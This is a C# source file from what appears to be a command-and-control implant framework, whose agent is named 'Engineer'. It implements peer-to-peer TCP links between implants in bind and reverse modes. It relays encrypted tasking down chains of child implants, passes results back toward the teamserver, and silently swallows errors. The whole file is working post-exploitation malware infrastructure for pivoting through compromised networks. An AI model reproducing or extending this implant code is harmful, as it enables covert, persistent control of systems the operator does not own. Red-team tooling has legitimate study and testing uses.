using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO.Pipes;
using System.IO;
using System.Security.Cryptography;
using System.Net.Http;
using System.Security.Policy;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using Engineer.Commands;
using System.Timers;
using System.Collections.Concurrent;
using System.Runtime.Remoting.Channels;
using Engineer.Functions;
using DynamicEngLoading;

namespace Engineer.Models
{
    public class EngTCPComm : EngCommBase
    {
        public int ServerPort { get; set; }     //sets the port to listen on when a server, or sets the port to try and connect into when a client
        public bool LocalHost { get; set; }      // sets if the server should listen on localhost only or on 0.0.0.0
        public bool IsServer { get; set; }
        public bool IsClient { get; set; }  
        public bool IsParent { get; set; }
        private IPAddress Bindip { get; set; }   //where to connect when TcpComm is a client 
        public ConnectionMode connectionMode { get; set; } // always means direction of parent -> child 
        public static readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> ParentToChildData = new(); //key is a unique id for the child, value is a queue of data to send to the child should be C2TaskMessages
        public static readonly ConcurrentDictionary<string, ConcurrentQueue<byte[]>> ChildToParentData = new(); // key is a unique id for the parent, value is a queue of data to send to the parent should be TaskResponse Array
        internal CancellationTokenSource _tokenSource = new();
        public static bool IsDataInTransit { get; set; } = false; // true when data is being read / written 
        public string ChildIdString { get; set; }

        public enum ConnectionMode
        {
            bind, 
            reverse
        }

        public EngTCPComm(int serverport, bool localhost, bool isParent) //server, user could select to listen only on lh or not
        {
            IsParent = isParent;
            ServerPort = serverport;
            LocalHost = localhost;
            if (isParent)
            {
                connectionMode = ConnectionMode.reverse; // if this is the parent & a server, then parent -> child, is a reverse connection type
            }
            else if(!isParent)
            {
                connectionMode = ConnectionMode.bind; // if this is the child engineer & a server, then the parent -> child, is a bind connection type
            }
            IsServer = true;
        }

        public EngTCPComm(int serverport, string serverip, bool isParent) //client, user gives the ip and port to connect back to 
        {
            IsParent = isParent;
            ServerPort = serverport;
            Bindip = IPAddress.Parse(serverip);
            if (isParent)
            {
                connectionMode = ConnectionMode.bind; // if this is the parent & a client, then parent -> child, is a bind connection type
            }
            else if (!isParent)
            {
                connectionMode = ConnectionMode.reverse; // if this is the child engineer & a client, parent -> child, is a reverse connection type
            }
            IsClient = true;
        }

        public override void Stop()
        {

        }

        public override async Task Start()
        {
            if(IsClient)
            {
                if(IsParent)
                {
                    //Console.WriteLine("starting parent client");
                  Task.Run(async()=> await Start_Parent_Client()); //only started via the Connect command 
                }
                else if(!IsParent)
                {
                    //Console.WriteLine("starting child client");
                    Task.Run(async () => await Start_Child_Client()); // only started when the engineer is created
                }
            }
            else if (IsServer)
            {
                if(IsParent)
                {
                    //Console.WriteLine("starting parent server");
                    Task.Run(async () => await Start_Parent_Server()); //only started via the Connect command 
                    
                }
                else if (!IsParent)
                {
                    //Console.WriteLine("starting child server");
                    Task.Run(async () => await Start_Child_Server()); // only started when the engineer is created
                }
            }
        }

        public async Task Start_Parent_Server()
        {
            try
            {
                    // this will start a TcpListener, check the localhost bool if true listen on localhost only, if false listen on 0.0.0.0, and listen on the ServerPort 
                    var ip = LocalHost ? IPAddress.Loopback : IPAddress.Any;
                    var listener = new TcpListener(ip, ServerPort);
                    //Console.WriteLine($"starting server at {ip}:{ServerPort}");
                    listener.Start(100);
                    Connect.Output = $"starting server at {ip}:{ServerPort}";
                // async wait for a client to connect
                while (!_tokenSource.Token.IsCancellationRequested)
                {
                    var client = await listener.AcceptTcpClientAsync();
                    Task.Run(async () => await Handle_Parnets_Children(client));
                    await Task.Delay(10);
                }
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
               // Console.WriteLine(e.StackTrace);
            }
        }

        public async Task Handle_Parnets_Children(TcpClient client)
        {
            
            //once a client does connect for the first time this server will send the client the Program._metadata.Id and EngCommBase.Sleep values & get back the child's id , then add this EngTcpComm and the chidId to Program.TcpChildCommModules
            if (client.Connected)
            {
               // Console.WriteLine($"tcp client connected from {client.Client.RemoteEndPoint}");
            }
            byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
            byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
            byte[] IdSleep = Id.Concat(Sleep).ToArray();
            await client.SendData(IdSleep, _tokenSource.Token);
            while (true)
            {
                if (client.DataAvailable())
                {
                    IsDataInTransit = true;
                    byte[] ChildId = await client.ReceiveData(_tokenSource.Token);
                    ChildIdString = Encoding.ASCII.GetString(ChildId);
                    Program.TcpChildCommModules.TryAdd(ChildIdString, this);
                    ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
                    IsDataInTransit = false;
                    break;
                }
            }
            //once the child id is received, start a while loop to send and recive data from the child 
            while (true)
            {
                if (client.DataAvailable())
                {
                    IsDataInTransit = true;
                    byte[] ChildData = await client.ReceiveData(_tokenSource.Token); // should always be a TaskResponse[] , but the data is seralized & encrypted 
                   // Console.WriteLine($"{DateTime.Now} reading task response from child");
                    if (Program.TcpParentCommModules.Count() > 0) //if not this is the http Eng and this data can be queued to go to its parent 
                    {
                        ChildToParentData[Program.TcpParentCommModules.Keys.ElementAt(0)].Enqueue(ChildData); // this should be the current engineers only parent, if this value exists we are pushing data up the chain.
                    }
                    else
                    {
                        //else queue this data to be send back from http to ts
                        //Program.OutboundResponsesSent += 1;
                        await Program._commModule.P2PSent(ChildData);
                        IsDataInTransit = false;
                    }
                }
                if (ParentToChildData.ContainsKey(ChildIdString))
                {
                    if (ParentToChildData[ChildIdString].TryDequeue(out byte[] ParentData))
                    {
                        await client.SendData(ParentData, _tokenSource.Token); // should be an encrypted task 
                        IsDataInTransit = false;
                    }
                }
                await Task.Delay(10);
            }
        }

        public async Task Start_Parent_Client()
        {
            try
            {
                //make a new tcp client, connect to the ServerIP and BindPort , once connected, send the current Engineers Id and Sleep value to the server, then get back the server's Id, then add this EngTcpComm and the server's Id to Program.TcpParentCommModules
                var client = new TcpClient();
                //Console.WriteLine("parent trying to connect to child");
                await client.ConnectAsync(Bindip, ServerPort);
                if(client.Connected)
                {
                    Connect.Output = "Connected to client at " + Bindip + ":" + ServerPort;
                    //Console.WriteLine("parent connected to child");
                }
                IsDataInTransit = true;
                byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                byte[] Sleep = BitConverter.GetBytes(EngCommBase.Sleep);
                byte[] IdSleep = Id.Concat(Sleep).ToArray();
                await client.SendData(IdSleep, _tokenSource.Token);
                IsDataInTransit = false;
                
                //await client.SendData(Sleep, _tokenSource.Token);
                while (true)
                {
                    if (client.DataAvailable())
                    {
                        IsDataInTransit = true;
                        //Console.WriteLine("Tcp Data in Transit is True");
                        if (!Program.IsEncrypted)
                        {
                            byte[] ChildId = await client.ReceiveData(_tokenSource.Token);
                            ChildIdString = Encoding.ASCII.GetString(ChildId);
                           // Console.WriteLine($"got back child id {ChildIdString}");
                            Program.TcpChildCommModules.TryAdd(ChildIdString, this);
                            ParentToChildData.TryAdd(ChildIdString, new ConcurrentQueue<byte[]>());
                            IsDataInTransit = false;
                            break;
                        }
                    }
                }
                //once the child id is received, start a while loop to send and recive data from the child
                //Console.WriteLine($"{DateTime.UtcNow} starting parent to child loop");
                while (true)
                {
                    if (client.DataAvailable())
                    {
                        //Console.WriteLine($"{DateTime.UtcNow} data available from child");
                        IsDataInTransit = true;
                        while (Program.IsEncrypted)
                        {
                            Thread.Sleep(10);
                        }
                        if (!Program.IsEncrypted)
                        {
                            // should always be a TaskResponse[] , but the data is seralized & encrypted 
                            byte[] ChildData = await client.ReceiveData(_tokenSource.Token); 
                            //Console.WriteLine($"{DateTime.UtcNow} reading task response from child");
                            //if this is not the http eng we are pushing data up the chain
                            if (Program.TcpParentCommModules.Count() > 0) 
                            {
                                //Console.WriteLine("queueing task response for parent to push up chain");
                                // this should be the current engineers only parent, if this value exists we are pushing data up the chain
                                ChildToParentData[Program.TcpParentCommModules.Keys.ElementAt(0)].Enqueue(ChildData); 
                            }
                            else
                            {
                                //else queue this data to be send back from http to ts
                                await Program._commModule.P2PSent(ChildData);
                                IsDataInTransit = false;
                            }
                        }
                        IsDataInTransit = false;
                    }
                    //sends tasking to child
                    if (ParentToChildData.ContainsKey(ChildIdString))
                    {
                        while (!ParentToChildData[ChildIdString].IsEmpty)
                        {
                            if (ParentToChildData[ChildIdString].TryDequeue(out byte[] ParentData))
                            {
                                IsDataInTransit = true;
                                while (Program.IsEncrypted)
                                {
                                    Thread.Sleep(10);
                                }
                                await client.SendData(ParentData, _tokenSource.Token);
                            }
                        }
                        IsDataInTransit = false;
                    }
                    await Task.Delay(10);
                }

            }
            catch (Exception ex)
            {
                Connect.Output = ex.Message;
               // Console.WriteLine(ex.Message);
               // Console.WriteLine(ex.StackTrace);
            }
            
        }

        public async Task Start_Child_Server()
        {
            try
            {
                // this will start a TcpListener, check the localhost bool if true listen on localhost only, if false listen on 0.0.0.0 and listen on the ServerPort
                var ip = LocalHost ? IPAddress.Loopback : IPAddress.Any;
                var listener = new TcpListener(ip, ServerPort);
                //Console.WriteLine($"starting server at {ip}:{ServerPort}");
                listener.Start(100);
                //wait async for the client, when it connects it will send the parent's id and the sleep value, then this child will send back the child's id, then add this EngTcpComm and the parentId to Program.TcpParentCommModules
                var client = await listener.AcceptTcpClientAsync();
                if(client.Connected)
                {
                   // Console.WriteLine($"tcp client connected from {client.Client.RemoteEndPoint}");
                }
                while (true)
                {
                    if (client.DataAvailable())
                    {
                       // Console.WriteLine($"{DateTime.UtcNow} tcp data available from parent");
                        IsDataInTransit = true;
                        while (Program.IsEncrypted)
                        {
                            Thread.Sleep(5);
                        }
                        if (!Program.IsEncrypted)
                        {
                            byte[] ParentIdSleep = await client.ReceiveData(_tokenSource.Token);
                            byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                            byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                            string ParentIdString = Encoding.ASCII.GetString(ParentId);
                            //Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
                            //Console.WriteLine($"got back parent id {ParentIdString}");
                            //update EngBaseComm Sleep value
                            EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
                           // Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                            Program.TcpParentCommModules.TryAdd(ParentIdString, this);
                            ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                            byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                            //Console.WriteLine($"Id {Program._metadata.Id}");
                            await client.SendData(Id, _tokenSource.Token);
                            var firstCheckTask = new EngineerTask
                            {
                                Id = Guid.NewGuid().ToString(),
                                Command = "P2PFirstTimeCheckIn",
                                Arguments = new Dictionary<string, string> {
                            { "/parentid", ParentIdString }
                            },
                                IsBlocking = true
                            };
                            await Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
                            FirstCheckIn.firstCheckInDone = true;
                            IsDataInTransit = false;
                            break;
                        }
                    }
                }
                //once the parent id is received, start a while loop to send and recive data from the parent
                //Console.WriteLine($"{DateTime.UtcNow} starting child to parent loop");
                while (true)
                {
                    if (client.Connected)
                    {
                        IsChildConnectedToParent = true;
                    }
                    else if (!client.Connected)
                    {
                        IsChildConnectedToParent = false;
                    }
                    if (client.DataAvailable())
                    {
                        IsDataInTransit = true;
                        if (!Program.IsEncrypted)
                        {
                            byte[] ParentData = await client.ReceiveData(_tokenSource.Token); // should always be a C2Message[] , but the data is seralized & encrypted  NEED TO CHANGE so we can process this C2Message
                            //Console.WriteLine($"{DateTime.UtcNow} reading C2 Task from Parent");

                            byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData, Program.MessagePathKey);
                            C2Message incomingMessage = seralizedParentData.JsonDeserialize<C2Message>();
                            //check the C2Message PathMessage Count if its highrt then 0, read the first item and if that matches the current engineers id add the message to the queue
                            if (incomingMessage.PathMessage.ElementAt(0) == Program._metadata.Id)
                            {
                                incomingMessage.PathMessage.RemoveAt(0);
                                if (incomingMessage.PathMessage.Count > 0)
                                {
                                    var childid = incomingMessage.PathMessage[0];
                                    var seeralizedMessage = incomingMessage.JsonSerialize();
                                    var EncryptedMessage = Encryption.AES_Encrypt(seeralizedMessage, Program.MessagePathKey);
                                    ParentToChildData[childid].Enqueue(EncryptedMessage);
                                }
                                //else this task is for this current engineer and should be added to the taskQueue
                                else
                                {
                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.Data.ToArray(), "", Program.UniqueTaskKey);
                                    HandleResponse(decryptedTaskData);
                                }
                            }
                        }
                        
                    }
                    
                    if (ChildToParentData.ContainsKey(Program.TcpParentCommModules.Keys.ElementAt(0)))
                    {
                        //if the ChildToParentData dictionary has values for the parent Id , send the data to the parent
                        while (!ChildToParentData[Program.TcpParentCommModules.Keys.ElementAt(0)].IsEmpty)
                        {
                            if (ChildToParentData[Program.TcpParentCommModules.Keys.ElementAt(0)]
                                .TryDequeue(out byte[] ForwardedChildData))
                            {
                                IsDataInTransit = true;
                                while (Program.IsEncrypted)
                                {
                                    Thread.Sleep(5);
                                }
                               // Console.WriteLine($"{DateTime.UtcNow} calling send data to parent");
                                await client.SendData(ForwardedChildData, _tokenSource.Token);
                            }
                        }
                        IsDataInTransit = false;
                    }
                    await Task.Delay(5);
                }
                Console.WriteLine("Server While True Exited ERROR");
            }
            catch (Exception ex)
            {
              //Console.WriteLine(ex.Message);
              //Console.WriteLine(ex.StackTrace);
            } 
        }

        public async Task Start_Child_Client()
        {
            try
            {
                // make a new tcp client , connect to the ServerIP and bindPort, once connected, recieve the parentId and sleep time, then send back the current engineer id
                var client = new TcpClient();
                //Console.WriteLine("child trying to connect to parent");
                await client.ConnectAsync(Bindip, ServerPort);
                if (client.Connected)
                {
                    Connect.Output = "Connected to client at " + Bindip.ToString() + ":" + ServerPort.ToString();
                    //Console.WriteLine("child connected to parent");
                }
                while (true)
                {
                    if (client.DataAvailable())
                    {
                        IsDataInTransit = true;
                        if (!Program.IsEncrypted)
                        {
                            byte[] ParentIdSleep = await client.ReceiveData(_tokenSource.Token);
                            byte[] ParentId = ParentIdSleep.Take(36).ToArray();
                            byte[] Sleep = ParentIdSleep.Skip(36).Take(4).ToArray();
                            string ParentIdString = Encoding.ASCII.GetString(ParentId);
                           //Console.WriteLine($"got back parent id byte size of {ParentId.Length}");
                           // Console.WriteLine($"got back parent id {ParentIdString}");
                            EngCommBase.Sleep = BitConverter.ToInt32(Sleep, 0);
                           // Console.WriteLine($"got back parent sleep value {EngCommBase.Sleep}");
                            Program.TcpParentCommModules.TryAdd(ParentIdString, this);
                            ChildToParentData.TryAdd(ParentIdString, new ConcurrentQueue<byte[]>());
                            var firstCheckTask = new EngineerTask
                            {
                                Id = Guid.NewGuid().ToString(),
                                Command = "P2PFirstTimeCheckIn",
                                Arguments = new Dictionary<string, string> {
                            { "/parentid", ParentIdString }
                            },
                                IsBlocking = true
                            };
                            Task.Run(async () => await Tasking.DealWithTask(firstCheckTask));
                            byte[] Id = Encoding.ASCII.GetBytes(Program._metadata.Id);
                            client.SendData(Id, _tokenSource.Token);
                            IsDataInTransit = false;
                            break;
                        }
                    }
                }
                //once the child Id is sent, start a while loop to send and recive data to the parent 
                while (true)
                {
                    if (client.Connected)
                    {
                        IsChildConnectedToParent = true;
                    }
                    else if (!client.Connected)
                    {
                        IsChildConnectedToParent = false;
                    }
                    if (client.DataAvailable())
                    {
                        IsDataInTransit = true;
                        if (!Program.IsEncrypted)
                        {
                            byte[] ParentData = await client.ReceiveData(_tokenSource.Token); // should always be a C2Message[] , but the data is seralized & encrypted NEED TO CHANGE so we can process this C2Message
                            //Console.WriteLine($"{DateTime.Now} reading C2 Task from Parent");                                                                  
                                                                                                                                                           
                            byte[] seralizedParentData = Encryption.AES_Decrypt(ParentData, Program.MessagePathKey);
                            C2Message incomingMessage = seralizedParentData.JsonDeserialize<C2Message>();
                            //check the C2Message PathMessage Count if its highrt then 0, read the first item and if that matches the current engineers id add the message to the queue
                            if (incomingMessage.PathMessage.ElementAt(0) == Program._metadata.Id)
                            {
                                incomingMessage.PathMessage.RemoveAt(0);
                                if (incomingMessage.PathMessage.Count > 0)
                                {
                                    var childid = incomingMessage.PathMessage[0];
                                    var seeralizedMessage = incomingMessage.JsonSerialize();
                                    var EncryptedMessage = Encryption.AES_Encrypt(seeralizedMessage,Program.MessagePathKey);
                                    ParentToChildData[childid].Enqueue(EncryptedMessage);
                                }
                                //else this task is for this current engineer and should be added to the taskQueue
                                else
                                {
                                    byte[] decryptedTaskData = Encryption.AES_Decrypt(incomingMessage.Data.ToArray(), "", Program.UniqueTaskKey);
                                    HandleResponse(decryptedTaskData);
                                }
                            }
                        }
                    }
                    if (ChildToParentData.ContainsKey(Program._metadata.Id))
                    {
                        if (ChildToParentData[Program._metadata.Id].TryDequeue(out byte[] ChildData))
                        {
                            //Console.WriteLine("calling sendData for self");
                            await client.SendData(ChildData, _tokenSource.Token);
                            IsDataInTransit = false;
                        }
                    }
                    if (ChildToParentData.ContainsKey(Program.TcpParentCommModules.Keys.ElementAt(0)))
                    {
                        //if the ChildToParentData dictionary has values for the parent Id , send the data to the parent
                        if (ChildToParentData[Program.TcpParentCommModules.Keys.ElementAt(0)].TryDequeue(out byte[] ForwardedChildData))
                        {
                            // Console.WriteLine("calling send data to parent");
                            await client.SendData(ForwardedChildData, _tokenSource.Token);
                            IsDataInTransit = false;
                        }
                    }
                    await Task.Delay(10);
                }
            }
            catch(Exception ex)
            {
               // Console.WriteLine(ex.Message);
               // Console.WriteLine(ex.StackTrace);
            }
        }

        public override async Task CheckIn()
        {
            

        }
        
        public override async Task PostData()
        {
           

        }

        
        private bool HandleResponse(byte[] response) //if not null we have stuff to do 
        {
            try
            {
                var tasks = response.JsonDeserialize<List<EngineerTask>>();

                if (tasks != null && tasks.Any())
                {
                    foreach (var task in tasks)
                    {
                        InboundTasks.Enqueue(task);
                    }
                    return true;
                }
                return false;

            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
            }
            return false;
        }
    }


    internal static class Extensions
    {
        public static async Task<byte[]> ReceiveData(this TcpClient client, CancellationToken token)
        {
            try
            {
                using var ms = new MemoryStream();
                var ns = client.GetStream();

                int read;

                do
                {
                    var buf = new byte[65535];
                    read = await ns.ReadAsync(buf, 0, buf.Length, token);
                    //Console.WriteLine($"receiving data length {read}");
                    if (read == 0)
                        break;

                    await ms.WriteAsync(buf, 0, read, token);

                } while (read >= 65535);

                return ms.ToArray();
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.Message);
                //Console.WriteLine(e.StackTrace);
            }
            return null;
        }

        public static async Task SendData(this TcpClient client, byte[] data, CancellationToken token)
        {
            try
            {
                if (client.Connected)
                {
                    var ns = client.GetStream();
                   // Console.WriteLine($"{DateTime.UtcNow} sending data length {data.Length}");
                    await ns.WriteAsync(data, 0, data.Length, token);
                }

            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
              //  Console.WriteLine(e.StackTrace);
            }
        }

        public static bool DataAvailable(this TcpClient client)
        {
            if (client.Connected)
            {
                var ns = client.GetStream();
                return ns.DataAvailable;
            }
            return false;
        }
    }
}
